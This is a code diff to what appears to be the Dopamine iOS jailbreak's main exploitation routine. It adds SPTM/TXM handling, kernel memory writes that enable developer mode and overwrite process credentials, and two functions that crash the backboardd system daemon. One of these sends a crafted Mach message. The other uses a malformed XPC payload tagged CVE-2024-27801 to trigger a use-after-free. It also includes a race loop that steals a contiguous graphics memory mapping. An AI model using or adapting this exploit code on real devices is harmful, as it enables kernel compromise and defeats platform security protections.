@@ -9,6 +9,7 @@
 #import "DOEnvironmentManager.h"
 #import "DOExploitManager.h"
 #import "DOUIManager.h"
+#import "DOPreferenceManager.h"
 #import <sys/stat.h>
 #import <compression.h>
 #import <xpf/xpf.h>
@@ -23,6 +24,7 @@
 #import <libjailbreak/info.h>
 #import <libjailbreak/util.h>
 #import <libjailbreak/trustcache.h>
+#import <libjailbreak/trustcache_fs.h>
 #import <libjailbreak/kalloc_pt.h>
 #import <libjailbreak/jbserver_boomerang.h>
 #import <libjailbreak/signatures.h>
@@ -33,6 +35,8 @@
 #import <CoreServices/LSApplicationProxy.h>
 #import <sys/utsname.h>
 #import "spawn.h"
+#import "clock_alarm.h"
+#import <IOSurface/IOSurfaceRef.h>
 int posix_spawnattr_set_registered_ports_np(posix_spawnattr_t * __restrict attr, mach_port_t portarray[], uint32_t count);
 
 #define kCFPreferencesNoContainer CFSTR("kCFPreferencesNoContainer")
@@ -67,11 +71,20 @@ typedef NS_ENUM(NSInteger, JBErrorCode) {
 {
     NSString *kernelPath = [[DOEnvironmentManager sharedManager] accessibleKernelPath];
     if (!kernelPath) return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedToFindKernel userInfo:@{NSLocalizedDescriptionKey:@"Failed to find kernelcache. Ensure your device is properly connected to the internet. If it still does not work, try installing Dopamine via TrollStore instead."}];
-    NSLog(@"Kernel at %s", kernelPath.UTF8String);
+    NSLog(@"Kernel at %@", kernelPath);
+
+    NSString *sptmPath = [[DOEnvironmentManager sharedManager] accessibleSPTMPath];
+    if (sptmPath) {
+        NSLog(@"SPTM at %@", sptmPath);
+    }
+    NSString *txmPath = [[DOEnvironmentManager sharedManager] accessibleTXMPath];
+    if (txmPath) {
+        NSLog(@"TXM at %@", txmPath);
+    }
     
     [[DOUIManager sharedInstance] sendLog:DOLocalizedString(@"Patchfinding") debug:NO];
     
-    int r = xpf_start_with_kernel_path(kernelPath.fileSystemRepresentation);
+    int r = xpf_start_with_kernel_path(kernelPath.fileSystemRepresentation, sptmPath ? sptmPath.fileSystemRepresentation : NULL, txmPath ? txmPath.fileSystemRepresentation : NULL);
     if (r == 0) {
         char *sets[] = {
             "translation",
@@ -80,14 +93,17 @@ typedef NS_ENUM(NSInteger, JBErrorCode) {
             "physmap",
             "struct",
             "physrw",
-            "perfkrw",
+            "IOSurface",
+            NULL,
             NULL,
             NULL,
             NULL,
             NULL,
         };
 
-        uint32_t idx = 7;
+        uint32_t idx = 0;
+        while(sets[++idx]);
+
         if (xpf_set_is_supported("devmode")) {
             sets[idx++] = "devmode"; 
         }
@@ -97,10 +113,19 @@ typedef NS_ENUM(NSInteger, JBErrorCode) {
         if (xpf_set_is_supported("arm64kcall")) {
             sets[idx++] = "arm64kcall"; 
         }
+        if (xpf_set_is_supported("perfkrw")) {
+            sets[idx++] = "perfkrw";
+        }
 
         _systemInfoXdict = xpf_construct_offset_dictionary((const char **)sets);
         if (_systemInfoXdict) {
             xpc_dictionary_set_uint64(_systemInfoXdict, "kernelConstant.staticBase", gXPF.kernelBase);
+            if (gXPF.sptm) {
+                xpc_dictionary_set_uint64(_systemInfoXdict, "kernelConstant.staticSptmBase", gXPF.sptmBase);
+            }
+            if (gXPF.txm) {
+                xpc_dictionary_set_uint64(_systemInfoXdict, "kernelConstant.staticTxmBase", gXPF.txmBase);
+            }
             printf("System Info:\n");
             xpc_dictionary_apply(_systemInfoXdict, ^bool(const char *key, xpc_object_t value) {
                 if (xpc_get_type(value) == XPC_TYPE_UINT64) {
@@ -122,6 +147,13 @@ typedef NS_ENUM(NSInteger, JBErrorCode) {
     
     jbinfo_initialize_dynamic_offsets(_systemInfoXdict);
     jbinfo_initialize_hardcoded_offsets();
+
+    // Stash app identifier into jailbreakInfo
+    // This will later allow launchdhook to figure out which process is the dopamine app
+    if ([NSBundle mainBundle].bundleIdentifier) {
+        gSystemInfo.jailbreakInfo.appIdentifier = strdup([NSBundle mainBundle].bundleIdentifier.UTF8String);
+    }
+
     _systemInfoXdict = jbinfo_get_serialized();
     
     if (_systemInfoXdict) {
@@ -142,8 +174,9 @@ typedef NS_ENUM(NSInteger, JBErrorCode) {
 - (NSError *)doExploitation
 {
     DOExploit *kernelExploit = [DOExploitManager sharedManager].selectedKernelExploit;
-    DOExploit *pacBypass = [DOExploitManager sharedManager].selectedPACBypass;
-    DOExploit *pplBypass = [DOExploitManager sharedManager].selectedPPLBypass;
+    DOExploit *pacBypass     = [DOExploitManager sharedManager].selectedPACBypass;
+    DOExploit *pplBypass     = [DOExploitManager sharedManager].selectedPPLBypass;
+
     if (!kernelExploit) {
         return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedExploitation userInfo:@{NSLocalizedDescriptionKey:@"Kernel exploit is required but we did not find any"}];
     }
@@ -151,7 +184,12 @@ typedef NS_ENUM(NSInteger, JBErrorCode) {
         return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedExploitation userInfo:@{NSLocalizedDescriptionKey:@"PAC bypass is required but we did not find any"}];
     }
     if (!pplBypass && [DOEnvironmentManager sharedManager].isPPLBypassRequired) {
-        return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedExploitation userInfo:@{NSLocalizedDescriptionKey:@"PPL bypass is required but we did not find any"}];
+        if ([DOEnvironmentManager sharedManager].isSPTM) {
+            return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedExploitation userInfo:@{NSLocalizedDescriptionKey:@"SPTM bypass is required but we did not find any"}];
+        }
+        else {
+            return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedExploitation userInfo:@{NSLocalizedDescriptionKey:@"PPL bypass is required but we did not find any"}];
+        }
     }
     
     [[DOUIManager sharedInstance] sendLog:[NSString stringWithFormat:DOLocalizedString(@"Exploiting Kernel (%@)"), kernelExploit.name] debug:NO];
@@ -171,7 +209,13 @@ typedef NS_ENUM(NSInteger, JBErrorCode) {
     }
 
     if ([[DOEnvironmentManager sharedManager] isPPLBypassRequired]) {
-        [[DOUIManager sharedInstance] sendLog:[NSString stringWithFormat:DOLocalizedString(@"Bypassing PPL (%@)"), pplBypass.name] debug:NO];
+        if ([DOEnvironmentManager sharedManager].isSPTM) {
+            [[DOUIManager sharedInstance] sendLog:[NSString stringWithFormat:DOLocalizedString(@"Bypassing SPTM (%@)"), pplBypass.name] debug:NO];
+        }
+        else {
+            [[DOUIManager sharedInstance] sendLog:[NSString stringWithFormat:DOLocalizedString(@"Bypassing PPL (%@)"), pplBypass.name] debug:NO];
+        }
+
         if ([pplBypass load] != 0) {[pacBypass cleanup]; [kernelExploit cleanup]; return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedLoadingExploit userInfo:@{NSLocalizedDescriptionKey:[NSString stringWithFormat:@"Failed to load PPL bypass: %s", dlerror()]}];};
         if ([pplBypass run] != 0) {[pacBypass cleanup]; [kernelExploit cleanup]; return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedExploitation userInfo:@{NSLocalizedDescriptionKey:@"Failed to bypass PPL"}];}
         // At this point we presume the PPL bypass gave us unrestricted phys write primitives
@@ -207,6 +251,7 @@ typedef NS_ENUM(NSInteger, JBErrorCode) {
 {
     int r = [[DOExploitManager sharedManager] cleanUpExploits];
     if (r != 0) return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedCleanup userInfo:@{NSLocalizedDescriptionKey:[NSString stringWithFormat:@"Failed to cleanup exploits: %d", r]}];
+    IOSurface_map_cleanup();
     return nil;
 }
 
@@ -287,8 +332,17 @@ typedef NS_ENUM(NSInteger, JBErrorCode) {
 - (NSError *)ensureDevModeEnabled
 {
     if (@available(iOS 16.0, *)) {
-        uint64_t developer_mode_storage = kread64(ksymbol(developer_mode_enabled));
-        kwrite8(developer_mode_storage, 1);
+        uint64_t developer_mode_storage = 0;
+        if (ksymbol(developer_mode_enabled)) {
+            developer_mode_storage = kread64(ksymbol(developer_mode_enabled));
+        }
+        else if (ksymbol_txm(txm_developer_mode_storage)) {
+            developer_mode_storage = ksymbol_txm(txm_developer_mode_storage);
+        }
+
+        if (developer_mode_storage) {
+            kwrite8(developer_mode_storage, 1);
+        }
     }
     return nil;
 }
@@ -296,7 +350,7 @@ typedef NS_ENUM(NSInteger, JBErrorCode) {
 - (NSError *)loadBasebinTrustcache
 {
     trustcache_file_v1 *basebinTcFile = NULL;
-    if (trustcache_file_build_from_path([[NSBundle mainBundle].bundlePath stringByAppendingPathComponent:@"basebin.tc"].fileSystemRepresentation, &basebinTcFile) == 0) {
+    if (trustcache_file_build_from_path(JBROOT_PATH("/basebin/basebin.tc"), &basebinTcFile) == 0) {
         int r = trustcache_file_upload_with_uuid(basebinTcFile, BASEBIN_TRUSTCACHE_UUID);
         free(basebinTcFile);
         if (r != 0) return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedBasebinTrustcache userInfo:@{NSLocalizedDescriptionKey : [NSString stringWithFormat:@"Failed to upload BaseBin trustcache: %d", r]}];
@@ -354,7 +408,7 @@ void *boomerang_server(struct boomerang_info *info)
     int status = 0;
     do {
         if (waitpid(spawnedPid, &status, 0) == -1) {
-            return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedLaunchdInjection userInfo:@{NSLocalizedDescriptionKey : @"Waiting for jbctl failed"}];;
+            return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedLaunchdInjection userInfo:@{NSLocalizedDescriptionKey : @"Waiting for jbctl failed"}];
         }
     } while (!WIFEXITED(status) && !WIFSIGNALED(status));
 
@@ -484,6 +538,26 @@ void *boomerang_server(struct boomerang_info *info)
     return [[DOEnvironmentManager sharedManager] finalizeBootstrap];
 }
 
+- (NSError *)cleanUpPostExploitation
+{
+    if (@available(iOS 17.0, *)) {
+        uint64_t proc = proc_self();
+        uint64_t ucred = proc_ucred(proc);
+
+        // Get uid 0
+        kwrite32(ucred + koffsetof(ucred, svuid), 501);
+        kwrite32(ucred + koffsetof(ucred, ruid), 501);
+        kwrite32(ucred + koffsetof(ucred, uid), 501);
+        
+        // Get gid 0
+        kwrite32(ucred + koffsetof(ucred, rgid), 501);
+        kwrite32(ucred + koffsetof(ucred, svgid), 501);
+        kwrite32(ucred + koffsetof(ucred, groups), 501);
+    }
+
+    return nil;
+}
+
 - (void)runWithError:(NSError **)errOut didRemoveJailbreak:(BOOL*)didRemove showLogs:(BOOL *)showLogs
 {
     BOOL removeJailbreakEnabled = [[DOPreferenceManager sharedManager] boolPreferenceValueForKey:@"removeJailbreakEnabled" fallback:NO];
@@ -500,14 +574,21 @@ void *boomerang_server(struct boomerang_info *info)
     *errOut = [self gatherSystemInformation];
     if (*errOut) return;
     *errOut = [self doExploitation];
-    if (*errOut) return;
+    if (*errOut) {
+        // We don't care about the return value of cleanup at this point, we just need to prevent a panic on exit
+        [self cleanUpExploits];
+        return;
+    }
     
     gSystemInfo.jailbreakSettings.markAppsAsDebugged = appJITEnabled;
     gSystemInfo.jailbreakSettings.jetsamMultiplier = jetsamMultiplierOption ? (jetsamMultiplierOption.doubleValue / 2) : 0;
     
     [[DOUIManager sharedInstance] sendLog:DOLocalizedString(@"Building Phys R/W Primitive") debug:NO];
     *errOut = [self buildPhysRWPrimitive];
-    if (*errOut) return;
+    if (*errOut) {
+        [self cleanUpExploits];
+        return;
+    }
     [[DOUIManager sharedInstance] sendLog:DOLocalizedString(@"Cleaning Up Exploits") debug:NO];
     *errOut = [self cleanUpExploits];
     if (*errOut) return;
@@ -550,10 +631,13 @@ void *boomerang_server(struct boomerang_info *info)
     [[DOUIManager sharedInstance] sendLog:DOLocalizedString(@"Loading BaseBin TrustCache") debug:NO];
     *errOut = [self loadBasebinTrustcache];
     if (*errOut) return;
-    
+
     [[DOUIManager sharedInstance] sendLog:DOLocalizedString(@"Initializing Environment") debug:NO];
     *errOut = [self injectLaunchdHook];
     if (*errOut) return;
+    
+    // After the launchd hook is initialized, we need to make the app believe the device is jailbroken
+    [[DOEnvironmentManager sharedManager] setJailbroken:YES];
     
     // Now that we can, protect important system files by bind mounting on top of them
     // This will be always be done during the userspace reboot
@@ -580,8 +664,11 @@ void *boomerang_server(struct boomerang_info *info)
         *showLogs = NO;
         return;
     }
-    
+    *errOut = [self cleanUpPostExploitation];
+
+
     //printf("Starting launch daemons...\n");
+    //exec_cmd_trusted(JBROOT_PATH("/usr/bin/uicache"), "-a", NULL);
     //exec_cmd_trusted(JBROOT_PATH("/usr/bin/launchctl"), "bootstrap", "system", JBROOT_PATH("/Library/LaunchDaemons"), NULL);
     //exec_cmd_trusted(JBROOT_PATH("/usr/bin/launchctl"), "bootstrap", "system", JBROOT_PATH("/basebin/LaunchDaemons"), NULL);
     // Note: This causes the app to freeze in some instances due to launchd only having physrw_pte, we might want to only do it when neccessary
@@ -594,6 +681,156 @@ void *boomerang_server(struct boomerang_info *info)
 {
     [[DOUIManager sharedInstance] sendLog:DOLocalizedString(@"Rebooting Userspace") debug:NO];
     [[DOEnvironmentManager sharedManager] rebootUserspace];
+}
+
+- (IOSurfaceRef)allocatePurpleGfxMemWithSize:(size_t)size
+{
+    NSDictionary *surfaceProperties = @{
+        @"IOSurfaceMemoryRegion" : @"PurpleGfxMem",
+        @"IOSurfaceAllocSize" : @(size),
+    };
+    return IOSurfaceCreate((__bridge CFDictionaryRef)surfaceProperties);
+}
+
+- (BOOL)surfaceIsContiguous:(IOSurfaceRef)surface
+{
+    vm_address_t mem_addr = (vm_address_t)IOSurfaceGetBaseAddress(surface);
+    vm_size_t mem_size = (vm_size_t)IOSurfaceGetAllocSize(surface);
+    vm_region_submap_short_info_data_64_t info = {0};
+    uint32_t count = VM_REGION_SUBMAP_SHORT_INFO_COUNT_64;
+    natural_t depth = 9999999;
+    
+    kern_return_t kr = vm_region_recurse_64(mach_task_self(), &mem_addr, &mem_size, &depth, (vm_region_recurse_info_t)&info, &count);
+    return (kr == 0 && info.share_mode == SM_EMPTY && info.object_id != 0);
+}
+
+- (BOOL)contiguousMappingWorks
+{
+    IOSurfaceRef surface = [self allocatePurpleGfxMemWithSize:0x8000];
+    if (surface == NULL) return false;
+    
+    BOOL contiguous = [self surfaceIsContiguous:surface];
+    CFRelease(surface);
+    return contiguous;
+}
+
+- (BOOL)contiguousMappingWorkaroundNeeded
+{
+    DOExploit *kernelExploit = [DOExploitManager sharedManager].selectedKernelExploit;
+    if ([kernelExploit hasRequirement:@"contiguousMapping"]) {
+        return ![self contiguousMappingWorks];
+    }
+    return NO;
+}
+
+- (int)crashBackboardd
+{
+#pragma pack(push, 4)
+    typedef struct {
+        mach_msg_header_t header;
+        mach_msg_body_t body;
+        mach_msg_ool_descriptor_t archive;
+        NDR_record_t ndr;
+        mach_msg_type_number_t archiveLength;
+    } Request;
+#pragma pack(pop)
+    
+    kern_return_t bootstrap_look_up(mach_port_t, const char *, mach_port_t *);
+    
+    NSData *archive =
+        [NSKeyedArchiver archivedDataWithRootObject:@[ @[] ]
+                              requiringSecureCoding:YES
+                                              error:nil];
+    mach_port_t bootstrap = MACH_PORT_NULL;
+    mach_port_t service = MACH_PORT_NULL;
+
+    if (!archive ||
+        task_get_bootstrap_port(mach_task_self(), &bootstrap) != KERN_SUCCESS ||
+        bootstrap_look_up(bootstrap, "com.apple.backboard.hid.services", &service) != KERN_SUCCESS) {
+        return -1;
+    }
+
+    Request request = {0};
+    request.header.msgh_bits =
+        MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0) | MACH_MSGH_BITS_COMPLEX;
+    request.header.msgh_size = sizeof(request);
+    request.header.msgh_remote_port = service;
+    request.header.msgh_id = 6000032;   // kPostTouchAnnotationsMessageID
+    request.body.msgh_descriptor_count = 1;
+    request.archive.address = (void *)archive.bytes;
+    request.archive.size = (mach_msg_size_t)archive.length;
+    request.archive.copy = MACH_MSG_VIRTUAL_COPY;
+    request.archive.type = MACH_MSG_OOL_DESCRIPTOR;
+    request.ndr = NDR_record;
+    request.archiveLength = (mach_msg_type_number_t)archive.length;
+
+    (void)mach_msg(&request.header,
+                   MACH_SEND_MSG | MACH_SEND_TIMEOUT,
+                   request.header.msgh_size,
+                   0,
+                   MACH_PORT_NULL,
+                   1000,
+                   MACH_PORT_NULL);
+    
+    mach_port_deallocate(mach_task_self(), service);
+    return 0;
+}
+
+- (int)crashBackboardd_15
+{
+    // CVE-2024-27801
+    xpc_connection_t (*haxx_xpc_connection_create_mach_service)(const char *, dispatch_queue_t, uint64_t) = dlsym(RTLD_DEFAULT, "xpc_connection_create_mach_service");
+    if (!haxx_xpc_connection_create_mach_service) {
+        return -1;
+    }
+    xpc_connection_t client = haxx_xpc_connection_create_mach_service("com.apple.backboard.TouchDeliveryPolicyServer", NULL, 0);
+    xpc_connection_set_event_handler(client, ^(xpc_object_t event) {});
+    xpc_connection_resume(client);
+    xpc_object_t message = xpc_dictionary_create(NULL, NULL, 0);
+    uint8_t root[1024] = { 0 };
+    memcpy(root, "bplist17", strlen("bplist17"));
+    xpc_dictionary_set_data(message, "root",root, 1024);
+    xpc_dictionary_set_uint64(message, "proxynum", 1);
+    xpc_dictionary_set_uint64(message, "inv", 1);
+    uint8_t uaf_xpc[1024];
+    memset(uaf_xpc, 0x41, 1024);
+    xpc_dictionary_set_value(message, "ool", xpc_data_create(uaf_xpc, 1024));
+    xpc_connection_send_message_with_reply_sync(client, message);
+    return 0;
+}
+
+- (void)applyContiguousMappingWorkaround
+{
+    if (@available(iOS 16.0, *)) {
+        [self crashBackboardd];
+    }
+    else {
+        [self crashBackboardd_15];
+    }
+    // After backboardd has crashed, we have about 200ms until the new backboardd kills our app
+    // In this timeframe we need to steal it's contiguous PurpleGfxMem allocation
+    IOSurfaceRef surface = NULL;
+    do {
+        if (surface) {
+            CFRelease(surface);
+            surface = NULL;
+            usleep(50);
+        }
+        surface = [self allocatePurpleGfxMemWithSize:0x8000];
+    }
+    while (![self surfaceIsContiguous:surface]);
+    
+    printf("Got contiguous mapping surface %p\n", surface);
+    
+    // We keep the surface alive for another 20 seconds
+    // This persists our process being killed
+    // Once it is freed, the next Dopamine can regain the contiguous mapping
+    mach_port_t surfacePort = IOSurfaceCreateMachPort(surface);
+    kern_return_t kr = clock_alarm_preserve_port(surfacePort, 20);
+    mach_port_mod_refs(mach_task_self(), surfacePort, MACH_PORT_RIGHT_SEND, -1);
+    CFRelease(surface);
+    
+    printf("preserved port? %d\n", kr);
 }
 
 @end
